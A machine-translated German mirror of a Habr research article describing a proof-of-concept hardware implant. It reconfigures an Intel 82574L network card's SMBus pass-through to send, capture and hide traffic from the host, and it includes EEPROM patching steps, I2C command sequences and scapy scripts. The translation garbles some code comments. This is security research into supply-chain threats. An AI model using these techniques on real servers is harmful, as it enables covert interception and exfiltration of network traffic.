<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👕 🧣 👩‍👩‍👧‍👦 Machen Sie Ihr eigenes Implantat für die Elektronik 🕙 👐🏽 🙌🏼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die Geschichte von Bloomberg, dass einige Implantate angeblich auf den Motherboards installiert waren [die Chinesen verwendeten einen Mikrochip zur St...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Machen Sie Ihr eigenes Implantat für die Elektronik</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  Die Geschichte von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bloomberg,</a> dass einige Implantate angeblich auf den Motherboards installiert waren [die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Chinesen verwendeten einen Mikrochip zur Steuerung amerikanischer Computer</a> ], blieb nicht unbemerkt.  Danach teilten viele Menschen Ideen über die Möglichkeit, solche Implantate herzustellen (ihre geschätzte Größe, Fähigkeiten oder Nachweismethode). <br><br>  Einige Tage später veröffentlichte das <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bloomberg-</a> Magazin einen Artikel mit zusätzlichen Beweisen.  Folgendes hat unser Interesse geweckt: <br><blockquote>  Der legale Server hat Nachrichten auf die eine und das Implantat auf die andere Weise gesendet, aber es schien, dass der gesamte Datenverkehr von einem vertrauenswürdigen Server kam. </blockquote><br><a name="habracut"></a><br>  Es gibt Möglichkeiten, direkt vom Motherboard aus mit der Netzwerkkarte zu interagieren.  Mehrere Personen haben angegeben, dass Sie mit BMC (Baseboard Management Controller - eine Komponente, die zusätzlich zum Hauptkanal den Zugriff auf den Server ermöglicht) spielen können, mit der das Implantat den BMC steuern und Zugriff auf die Netzwerkkarte erhalten kann.  Aber wie funktioniert das in der Praxis?  Mal sehen, ob wir das reproduzieren können. <br><br><h2>  Ausgangsposition </h2><br>  Schauen wir uns die möglichen Schnittstellen zwischen der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Netzwerkkarte</a> und dem BMC an.  Eines der Hauptprotokolle für die Arbeit an einem dedizierten Kanal ist die intelligente IPMI-Plattformverwaltungsschnittstelle. <br><br><h3>  IPMI </h3><br>  Laut Wikipedia ist IPMI „eine intelligente Plattformverwaltungsschnittstelle zur autonomen Überwachung und Verwaltung von Funktionen, die direkt in die Hardware und Firmware von Serverplattformen integriert sind.  Die Hauptmerkmale von IPMI sind Überwachung, Wiederherstellung von Verwaltungsfunktionen, Protokollierung und Inventarisierung, die unabhängig von Prozessor, BIOS und Betriebssystem verfügbar sind.  Plattformverwaltungsfunktionen sind möglicherweise auch dann verfügbar, wenn das System ausgeschaltet ist. “  Sehr ähnlich zu dem, was wir brauchen. <br><br>  Das folgende Flussdiagramm zeigt einen möglichen Projektimplementierungspfad: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  IPMI definiert tatsächlich zwei Seitenbandkanäle für die Netzwerkkarte: SMBus und NC-SI.  NC-SI ist ein SMBus-Ersatz auf dem neuesten Stand der Technik, der verbesserte Datenübertragungsgeschwindigkeiten und andere neue Funktionen unterstützt.  Das Problem ist, dass sie mehr Signale benötigt (ungefähr 10) und es viel schwieriger ist, in ihre Arbeit einzugreifen, wenn wir mit einem Implantat arbeiten.  Lassen Sie uns zunächst auf SMBus eingehen. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SMBus</a> (System Management Bus) ist ein serielles Kommunikationsprotokoll für Stromversorgungsgeräte.  Einseitiger einfacher Zweidrahtbus für unkomplizierte Kommunikation.  Wird am häufigsten in Computern verwendet, um das Motherboard mit einer Stromquelle zu verbinden und Anweisungen ein- und auszuschalten.  Basierend auf dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">I <sup>2</sup> C-</a> Bus, der üblicherweise in Mikrocontrollern verwendet wird.  Die Schnittstelle benötigt nur zwei Signale (Taktfrequenz und Daten), und das dritte Signal ist ein Interrupt.  Perfekt für das Implantatspielprotokoll. <br><br><h2>  Erster Kontakt </h2><br>  Sie müssen schlau sein und mit BMC keinen Zugriff auf das Motherboard haben.  Bei der Untersuchung der technischen Eigenschaften der Server-Motherboards stellten wir fest, dass einige von ihnen den <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Intel 82574L-</a> Chip verwenden.  Der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Dokumentation</a> zufolge bietet es die "SMBus Advanced Pass-Through-Schnittstelle" - genau das, was Sie brauchen.  Und das Beste ist, dass es im PCI-E-Kartenformat erhältlich ist. <br><br><h3>  SMBus-Zugang </h3><br>  Wir sind in den Laden gegangen und haben jetzt <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Intel EXPI9301CTBLK-</a> Karten mit dem 82574L-Chip.  Was jetzt? <br><br>  Die Dokumentation kann SMB_DAT und SMB_ALRT_N verfolgen.  Glücklicherweise stellte sich heraus, dass sie alle an den Kontaktflächen verfügbar waren.  Alles scheint ganz einfach zu sein. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>NIC-Platine.</i>  <i>Oben links - EEPROM, oben rechts - Anschluss für SMBus [ALRT | CLK | DAT].</i>  <i>Bitte beachten Sie, dass R39 und R40 abgedichtet sind, was den Zugriff auf SMBus für den PCIe-Anschluss verhindert.</i> <br><br>  Wir haben die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">I <sup>2</sup> C-Sonde angeschlossen</a> und den SMBus gescannt, aber nichts Nützliches gezählt.  Die Dokumentation besagt, dass SMBus nur aktiviert ist, wenn ein bestimmtes Bitregister gesetzt ist.  Dieser Wert wird aus dem EEPROM geladen.  Es ist Zeit, tiefer zu graben. <br><br><h3>  Aktivieren Sie den Zugriff auf SMBus </h3><br>  Die Dokumentation hilft uns wieder.  Der Zugriff auf SMBus wird durch den Wert des aus dem NIC-EEPROM geladenen Registers bestimmt.  Glücklicherweise kann das EEPROM mit Flashrom gelesen werden.  Durch Speichern des Inhalts des EEPROM können wir die Werte analysieren und ändern: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  Nach der NVM-Karte (Kapitel 6.1 der Dokumentation) zu urteilen, ist es klar, dass wir zwei Werte ändern müssen: <br><br><ul><li>  Init Control Word 2 [MNGM] (Datenblatt Kapitel 6.1.1.6) </li><li>  Kompatibilität [ASF SMBus Connected] (Datenblatt Kapitel 6.1.2.1.1) </li><li>  Kompatibilität [SMBus Connected] (Datenblatt Kapitel 6.1.2.1.1) </li></ul><br>  Es muss nur berücksichtigt werden, dass im EEPROM Daten im Little-Endian-Format gespeichert sind. <br><br>  Danach müssen wir uns noch mit dem Wert von Checksum befassen.  In Kapitel 6.1.2.11 heißt es, dass die Summe aller Wörter im Bereich [0x00-0x40] 0xBABA sein sollte.  Ein bisschen Python hilft uns dabei, die richtige Prüfsumme zu berechnen: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  Und schließlich alle unsere Änderungen für EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Nachdem wir Änderungen vorgenommen und das EEPROM geflasht haben, haben wir eine I <sup>2</sup> C-Sonde angeschlossen und: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  Die Adresse I <sup>2</sup> C ist in sieben Bits codiert, die Adresse, die wir benötigen, wird als 0x49 &lt;&lt; 1 = 0x92 erhalten. <br><br>  Jetzt haben wir ein Arbeitsdiagramm für unser Implantat.  Wir können Befehle an die Netzwerkkarte senden: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Informationen erhalten </h2><br>  Wie Sie vielleicht vermutet haben, haben wir die Dokumentation weiter gelesen und speziell vorbereitete Befehle an die Netzwerkkarte gesendet, um zu überprüfen, ob alles wie erwartet funktioniert hat. <br><br>  In der Dokumentation wird in Kapitel 8.4.4 alles beschrieben, was Sie über das Transaktionsformat wissen müssen.  Der einzige Unterschied besteht darin, dass wir die PEC nicht berechnen müssen (Prüfsumme für SMBus, die für jedes Paket berechnet wird).  Zum Beispiel können wir den CMD-Befehl in der folgenden Reihenfolge an die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">SLAVE-</a> Adresse senden: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [START] und [STOP] sind die durch I <sup>2</sup> C definierten START- und STOP-Bedingungen. <br><br>  Der Befehl zum Lesen der MAC-Adresse (beschrieben in Kapitel 8.8.2.3) lautet beispielsweise 0xD4.  Wir senden den Befehl im I <sup>2</sup> C-Modus an SMBus: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Bei der Übertragung an Hydrabus-Teams gilt Folgendes: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  Und ja, wir bekommen unsere MAC-Adresse! <br><br><h2>  Ein Implantat herstellen </h2><br>  Nachdem Sie nun wissen, wie Sie mit der Netzwerkkarte kommunizieren können, wollen wir sehen, wie Sie diesen Kanal verwenden können, um den Netzwerkverkehr zu stehlen und Daten über das Netzwerk zu senden.  Kapitel 8 der Dokumentation beschreibt alles, was Sie dazu benötigen. <br><br><h3>  Pakete senden </h3><br>  Beschrieben in den Kapiteln 8.6 und 8.8.1.  Wir können einfach einen Ethernet-Frame mit Befehlen erstellen.  Hier ist ein Beispielskript für <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hydrabus</a> oder <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Bus Pirate</a> zum Senden eines Pakets: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Nach dem Ausführen des Skripts können Sie sehen, dass das Paket mit dem Implantat von der Maschine kommt, und am interessantesten ist, dass der Server selbst dieses Paket überhaupt nicht sieht: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump vom Computer des Angreifers links, Server rechts</i> <br><br><h3>  Pakete lesen </h3><br><h4>  Filtern </h4><br>  Um herauszufinden, welche Frames an SMBus gesendet werden sollen, verwendet die Netzwerkkarte Steuerfilter.  Sie ordnen den Datenverkehr aus dem Netzwerk zu und leiten ihn entweder an PCIe oder an SMBus oder sowohl dort als auch dort weiter.  Dies gibt uns aus unserer Sicht große Flexibilität: <br><br><ul><li>  Sie können den Datenverkehr verfolgen, indem Sie einen Filter festlegen, der ihn scannt und an PCIe und SMBus umleitet. </li><li>  Sie können den Datenverkehr verschwinden lassen, indem Sie ihn nur an SMBus weiterleiten. </li><li>  Sie können mit dem Implantat einen versteckten Kanal erstellen, der für den Server nicht sichtbar ist. </li></ul><br>  Am interessantesten ist, dass der Filter so konfiguriert werden kann, dass er verschiedene Rahmenelemente verfolgt: <br><br><ul><li>  UDP / TCP-Port </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  MAC-Adresse </li><li>  ... </li></ul><br>  (Eine vollständige Liste finden Sie in Kapitel 8.4.2.1.) <br><br>  Es stehen sieben unabhängige MDEF-Filter [0: 6] zur Verfügung, von denen jeder so konfiguriert werden kann, dass der entsprechende Datenverkehr über SMBus über das MANC2H-Register an PCIe umgeleitet wird (weitere Informationen siehe Kapitel 8.4.3). <br><br><h4>  Implementierung </h4><br>  Es stellte sich als ziemlich schwierig heraus, alles richtig einzurichten. Wir haben viele verschiedene Kombinationen ausprobiert, damit der Filter funktioniert.  Glücklicherweise gab uns der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Hinweis</a> zur Intel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">-Anwendung</a> mehr Details darüber, wie Filter so ausgeführt werden, wie wir es benötigen. <br><br>  Mit unserer I <sup>2</sup> C-Sonde können wir all dies mit vier Befehlen konfigurieren: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Wie in Kapitel 8.8.1.3 beschrieben, müssen mehrere Bits gesetzt werden, um den Datenempfang zu ermöglichen und Frames an unser Implantat zurückzusenden.  Wir haben uns für die SMBus-Warnung entschieden, da die Netzwerkkarte bei anderen Modellen asynchrone Anforderungen an SMBus senden kann (Einzelheiten siehe Kapitel 8.4.5). <br><br><h4>  Frames lesen </h4><br>  Da wir die SMBus-Warnmethode verwendet haben, mussten wir warten, bis das Signal SMB_ALRT_N ausgeschaltet wurde, bevor wir den Befehl TCO-Paket empfangen senden.  Wenn wir zu lange warten, wird das Paket von der Netzwerkkarte abgelehnt. <br><br>  Um das Diagramm nur zu veranschaulichen, senden wir regelmäßig Frames und Lesebefehle - nur um zu bestätigen, dass dieses Prinzip funktioniert.  Das Schema sieht folgendermaßen aus: <br><br><ul><li>  Ein Server mit einem Implantat verfügt über Filter, die den Datenverkehr mit UDP / 623 überwachen (Kapitel 3.6.1.2). </li><li>  Das Implantat wird mit Hydrabus simuliert. </li><li>  Ein anderer Server sendet mithilfe des Scapy-Skripts Pakete, die unter den Filter fallen: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Es stellt sich etwas Interessantes heraus: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  Links liest SMBus den Frame, die Frame-Daten sind unten dargestellt.  Auf der rechten Seite zeigt tcpdump, das auf einem Server mit einem Implantat ausgeführt wird, keine eingehenden Frames an. <br><br><h4>  Rahmenrelais </h4><br>  Durch Ändern des MANC2H-Registers ist es möglich, den an SMBus und PCIe gesendeten Datenverkehr korrekt auf dem Server anzuzeigen.  Erstellen Sie beispielsweise einen Abfangfilter, der auf UDP / 161-Verkehr (SNMP) reagiert und ihn an SMBus und PCIe sendet: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Durch Aktivieren von Filtern können wir eine SNMP-Anforderung an den Server mit dem Implantat senden und das Paket anzeigen, das das Implantat abgefangen hat.  Gleichzeitig antwortet der Server auf die Anfrage - was bedeutet, dass das Paket korrekt an SMBus und PCIe umgeleitet wurde: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Oben ist eine abgefangene SNMP-Anfrage vom Implantat.</i>  <i>Unten - Die SNMP-Anforderung hat den Server erreicht.</i> <br><br><h2>  Schlussfolgerungen </h2><br>  Wir haben eine mögliche Methode zur Einführung eines kleinen und kostengünstigen Mikrocontrollers als Implantat auf NIC-Ebene beschrieben.  Ein solches Implantat benötigt mindestens vier Kontakte (Vcc, GND, CLK, DAT) und kann die Serverkarte steuern.  Unter seinen Merkmalen: <br><br><ul><li>  Abwarten auf eingehenden Netzwerkverkehr zum Server. </li><li>  Empfangen von Befehlen aus dem Netzwerk ohne Kenntnis des Servers. </li><li>  Datenübertragung über das Netzwerk ohne Kenntnis des Servers. </li></ul><br>  In unserem Beispiel wurde der Einfachheit halber Hydrabus als Schnittstelle für den I <sup>2</sup> C / SMBus verwendet, dies kann jedoch genauso einfach auf einem kleinen Mikrocontroller durchgeführt werden, z. B. ATtiny85 (es entspricht etwa der Größe eines EEPROM für NIC). <br><br>  Im wirklichen Leben wäre der Zugang zu einem solchen Implantat jedoch nur für SMBus möglich.  Abhängig vom Motherboard-Schema ist möglicherweise nur dieses Gerät verfügbar. Eine Interaktion mit dem Server-Betriebssystem ist dann nicht möglich.  Wenn die vollständige Kontrolle über das Betriebssystem erforderlich ist, ändern Sie am besten den BMC-Code, da dieser bereits Zugriff auf alle interessanten Busse hat und keine sichtbaren Spuren auf dem Motherboard hinterlässt. <br><br>  Ein weiterer Nachteil eines solchen Implantats besteht darin, dass es Daten mit Geschwindigkeiten in der Größenordnung von 100 Kb / s übertragen kann, was für eine vollständige Untersuchung des Verkehrs nicht ausreicht.  Darüber hinaus kann das Implantat nur den vom Netzwerk kommenden Datenverkehr abfangen.  Infolgedessen scheint diese Lösung im Vergleich zu den Anstrengungen, die für ihre Implementierung in der Zielausrüstung erforderlich sind, unwirksam zu sein. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de429190/">https://habr.com/ru/post/de429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de429180/index.html">Geh zu goto</a></li>
<li><a href="../de429182/index.html">Künstliche Intelligenz stieß auf eine Barriere des Verstehens</a></li>
<li><a href="../de429184/index.html">Online-Medien brechen vorhersehbar die Kette über Oumuamua- und Harvard-Gelehrte</a></li>
<li><a href="../de429186/index.html">@ Pythonetc Oktober 2018</a></li>
<li><a href="../de429188/index.html">Übersicht über PICASO 3D Designer XL</a></li>
<li><a href="../de429192/index.html">Diese neuen Tricks können Deepfake-Videos immer noch überlisten.</a></li>
<li><a href="../de429194/index.html">7 Bibliotheken für die Android-Entwicklung auf Kotlin</a></li>
<li><a href="../de429196/index.html">iOS Runtime Mobile Exploration mit Objection oder Hack unserer eigenen Anwendung</a></li>
<li><a href="../de429198/index.html">Das Kernel-Bridge-Framework: Bridge in Ring0</a></li>
<li><a href="../de429202/index.html">Teure Kurse: lohnt es sich?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>